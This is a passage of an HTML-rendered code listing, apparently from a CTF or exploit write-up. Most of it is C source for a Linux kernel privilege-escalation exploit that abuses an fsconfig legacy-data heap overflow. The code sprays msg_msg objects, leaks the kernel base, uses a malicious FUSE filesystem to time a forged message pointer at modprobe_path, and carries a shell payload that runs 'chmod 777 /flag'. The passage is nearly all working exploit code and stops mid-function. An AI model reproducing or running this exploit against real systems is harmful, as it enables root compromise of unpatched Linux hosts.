class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FUSE_USE_VERSION 34</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fuse.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_SIZE 4096</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_SIZE 32</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TYPE <span class="hljs-string">&#x27;A&#x27;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_TYPE    <span class="hljs-string">&#x27;A&#x27;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_TYPE  <span class="hljs-string">&#x27;B&#x27;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VICTIM_MSG_TYPE     0x1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TAG     0xAAAAAAAA</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_QUEUE_NUM 0x10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SEQ_FILE_NUM 0x100</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_HOLE_SPACE 8</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EVIL_FILE_NAME <span class="hljs-string">&quot;a3fuse_evil_file&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EVIL_DAEMON_NAME <span class="hljs-string">&quot;evil_fuse&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EVIL_MOUNT_PATH <span class="hljs-string">&quot;/tmp/evil&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EVIL_FILE_PATH EVIL_MOUNT_PATH <span class="hljs-string">&quot;/&quot;</span> EVIL_FILE_NAME</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    prev;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">uint64_t</span>    m_type;<br>    <span class="hljs-type">uint64_t</span>    m_ts;<br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) <br>               + SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msgseg)];<br>&#125; primary_msg;<br><br><span class="hljs-type">char</span> *evil_args[] = &#123; EVIL_DAEMON_NAME, EVIL_MOUNT_PATH, <span class="hljs-literal">NULL</span> &#125;;<br><span class="hljs-type">int</span> exp_fs_fd;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_readdir</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-type">void</span>* buf, </span><br><span class="hljs-params">                               <span class="hljs-type">fuse_fill_dir_t</span> filler, <span class="hljs-type">off_t</span> offset, </span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> fuse_file_info* fi, </span><br><span class="hljs-params">                               <span class="hljs-keyword">enum</span> fuse_readdir_flags flags)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_getattr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-keyword">struct</span> stat *stbuf, </span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_read</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                            <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_write</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                             <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span>;<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fuse_operations</span> <span class="hljs-title">a3fuse_evil_ops</span> =</span> &#123;<br>    .readdir = a3fuse_evil_readdir,<br>    .getattr = a3fuse_evil_getattr,<br>    .read = a3fuse_evil_read,<br>    .write = a3fuse_evil_write,<br>&#125;;<br><br><span class="hljs-type">char</span> cat_flag[] = <span class="hljs-string">&quot;#!/bin/sh\nchmod 777 /flag&quot;</span>;<br><br><span class="hljs-type">size_t</span> kernel_base = <span class="hljs-number">0xffffffff81000000</span>, kernel_offset = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\n\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, </span><br><span class="hljs-params">             <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">readMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">writeMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    *(<span class="hljs-type">long</span>*)msgp = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">peekMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> __msgsz = msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>);<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, __msgsz, msgtyp, <br>                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">buildMsg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">uint64_t</span> m_list_next, <span class="hljs-type">uint64_t</span> m_list_prev, </span><br><span class="hljs-params">              <span class="hljs-type">uint64_t</span> m_type, <span class="hljs-type">uint64_t</span> m_ts,  <span class="hljs-type">uint64_t</span> next, <span class="hljs-type">uint64_t</span> security)</span><br>&#123;<br>    msg-&gt;m_list.next = m_list_next;<br>    msg-&gt;m_list.prev = m_list_prev;<br>    msg-&gt;m_type = m_type;<br>    msg-&gt;m_ts = m_ts;<br>    msg-&gt;next = next;<br>    msg-&gt;security = security;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_readdir</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-type">void</span>* buf, </span><br><span class="hljs-params">                               <span class="hljs-type">fuse_fill_dir_t</span> filler, <span class="hljs-type">off_t</span> offset, </span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> fuse_file_info* fi, </span><br><span class="hljs-params">                               <span class="hljs-keyword">enum</span> fuse_readdir_flags flags)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(path, <span class="hljs-string">&quot;/&quot;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> -ENOENT;<br>    &#125;<br><br>    filler(buf, <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    filler(buf, <span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    filler(buf, EVIL_FILE_PATH, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_getattr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-keyword">struct</span> stat *stbuf, </span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(path, <span class="hljs-string">&quot;/&quot;</span>)) &#123;<br>        stbuf-&gt;st_mode = <span class="hljs-number">0755</span> | S_IFDIR;<br>        stbuf-&gt;st_nlink = <span class="hljs-number">2</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(path + <span class="hljs-number">1</span>, EVIL_FILE_PATH)) &#123;<br>        stbuf-&gt;st_mode = <span class="hljs-number">0644</span> | S_IFREG;<br>        stbuf-&gt;st_nlink = <span class="hljs-number">1</span>;<br>        stbuf-&gt;st_size = <span class="hljs-number">0x1000</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> -ENOENT;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_read</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                            <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span><br>&#123;<br>    <span class="hljs-comment">/* I only set one page there */</span><br>    <span class="hljs-type">char</span> evil_buf[<span class="hljs-number">0x1000</span>], fake_msg[<span class="hljs-number">0x100</span>];<br>    <br>    <span class="hljs-keyword">if</span> (offset &gt;= <span class="hljs-number">0x1000</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (offset + size &gt; <span class="hljs-number">0x1000</span>) &#123;<br>        size = <span class="hljs-number">0x1000</span> - offset;<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(evil_buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(evil_buf));<br>    <span class="hljs-built_in">strcpy</span>(evil_buf, <span class="hljs-string">&quot;arttnba3/tmp/evil.sh&quot;</span>);<br>    <span class="hljs-built_in">memcpy</span>(buf, evil_buf + offset, size);<br><br>    <span class="hljs-comment">/* fake msg_msg with `next` pointing to modprobe_path*/</span><br>    buildMsg(fake_msg, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>, <br>             *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">0xffffffff82891160</span> + kernel_offset, <br>             *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>);<br>    fsconfig(exp_fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;&quot;</span>, fake_msg + <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_write</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                             <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span><br>&#123;<br>    <span class="hljs-comment">/* I only set one page there */</span><br>    <span class="hljs-type">char</span> evil_buf[<span class="hljs-number">0x1000</span>];<br>    <br>    <span class="hljs-keyword">if</span> (offset &gt;= <span class="hljs-number">0x1000</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (offset + size &gt; <span class="hljs-number">0x1000</span>) &#123;<br>        size = <span class="hljs-number">0x1000</span> - offset;<br>    &#125;<br><br>    <span class="hljs-built_in">memcpy</span>(evil_buf + offset, buf, size);<br>    <br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief make an out-of-bound write to the next object in kmalloc-4k,</span><br><span class="hljs-comment"> * note that the buf before will always be appended to a &quot;,=&quot;,</span><br><span class="hljs-comment"> * for a ctx-legacy_data with 4095 bytes&#x27; data, the &#x27;,&#x27; will be the last byte,</span><br><span class="hljs-comment"> * and the &#x27;=&#x27; will always be on the first by of the object nearby</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * @param buf buf to write to next object</span><br><span class="hljs-comment"> * @return int - the fd for filesystem context</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">oobWritePrepare</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd;<br><br>    <span class="hljs-comment">/* get a filesystem context */</span><br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to fsopen()!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * fulfill the ctx-&gt;legacy_data to 4095 bytes, </span><br><span class="hljs-comment">     * so that the (PAGE_SIZE - 2 - size) overflow</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">255</span>; i++) &#123;<br>        fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-string">&quot;pwnnn&quot;</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> fs_fd;    <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">leakKernelBase</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd;<br>    <span class="hljs-type">int</span> msqid[MSG_QUEUE_NUM];<br>    <span class="hljs-type">int</span> seq_fd[SEQ_FILE_NUM];<br>    <span class="hljs-type">char</span> m_ts_buf[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-type">uint64_t</span> buf[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-comment">/* create message queue */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] create message queue for data leaking...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT)) &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to create msg_queue!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* spray msg_msg in half of message queues and seq_file */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray msg_msg in half of message queues and seq_files...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (MSG_QUEUE_NUM / <span class="hljs-number">2</span>); i++) &#123;<br>        <span class="hljs-built_in">memset</span>(&amp;primary_msg.mtext, <span class="hljs-string">&#x27;A&#x27;</span> + i, <span class="hljs-keyword">sizeof</span>(primary_msg) - <span class="hljs-keyword">sizeof</span>(<span 